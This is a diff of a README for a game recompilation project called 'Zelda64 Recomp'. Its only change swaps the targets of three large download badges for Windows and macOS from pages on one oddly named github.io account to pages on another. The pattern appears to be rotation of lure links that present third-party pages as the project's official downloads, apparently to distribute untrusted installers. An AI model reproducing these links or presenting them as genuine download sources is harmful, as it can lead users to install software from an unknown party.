@@ -30,7 +30,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Zelda64 Recomp](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_ZELDA64_RECOMP-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://TerminusAgentLine.github.io/windows-setup/)
+[![Download Zelda64 Recomp](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_ZELDA64_RECOMP-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
 
 </div>
 
@@ -76,8 +76,8 @@ Getting started with **Zelda64 Recomp** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-2E7D32?style=for-the-badge&logo=windows&logoColor=white)](https://TerminusAgentLine.github.io/windows-setup/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-2E7D32?style=for-the-badge&logo=apple&logoColor=white)](https://TerminusAgentLine.github.io/macos-setup/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-2E7D32?style=for-the-badge&logo=windows&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-2E7D32?style=for-the-badge&logo=apple&logoColor=white)](https://supremedeckhandwire.github.io/mac-pkg/)
 
 </div>
 
